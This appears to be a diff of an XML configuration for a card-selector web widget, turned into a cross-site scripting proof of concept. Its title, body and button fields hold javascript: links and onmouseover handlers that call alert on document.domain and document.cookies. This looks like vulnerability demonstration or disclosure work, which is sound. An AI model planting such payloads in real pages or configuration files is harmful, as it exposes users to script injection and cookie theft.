@@ -1,39 +1,16 @@
 <PESCardSelector>
-   <settings>
-      <var n="min_content_height">400</var>
-      <var n="min_column_width">156</var>
-      <var n="min_content_width">488</var>
-      <var n="option_title_col">0x164B6D</var>
-      <var n="option_title_text_col">0xFFFFFF</var>
-      <var n="option_body_col">0xEAF2F5</var>
-      <var n="option_body_text_col">0x000000</var>
-      <var n="option_body_height">110</var>
-      <var n="option_button_col">0x5D7F98</var>
-      <var n="option_button_text_col">0xFFFFFF</var>
-      <var n="content_title_col">0x164B6D</var>
-      <var n="content_title_text_col">0xFFFFFF</var>
-      <var n="option_content_col">0xEAF2F5</var>
-      <var n="option_content_text_col">0x000000</var>
-      <var n="deep_blue_col">0x164B6D</var>
-      <var n="mid_blue_col">0x5D7F98</var>
-      <var n="light_blue_col">0xEAF2F5</var>
-      <var n="recommendations_url">pesx.cgi</var>
-   </settings>
    <top_options>
       <option id="0">
-         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
-         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
-         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
+         <title><![CDATA[Proof of concept 0]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a>]]></body>
       </option>
-      <option id="">
-         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
-         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
-         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
+      <option id="1">
+         <title><![CDATA[Proof of concept 1]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a>]]></body>
       </option>
       <option id="2">
-         <title><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></title>
-         <body><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></body>
-         <button><![CDATA[<a href='javascript:alert(document.domain)'>Click me (domain)</a><b onmouseover='javascript:alert(document.cookies)'>Over me (cookies)</b>]]></button>
+         <title><![CDATA[Proof of concept 2]]></title>
+         <body><![CDATA[<a href='javascript:alert(document.cookies)'>Click me (cookies)</a>]]></body>
       </option>
    </top_options>
 </PESCardSelector>
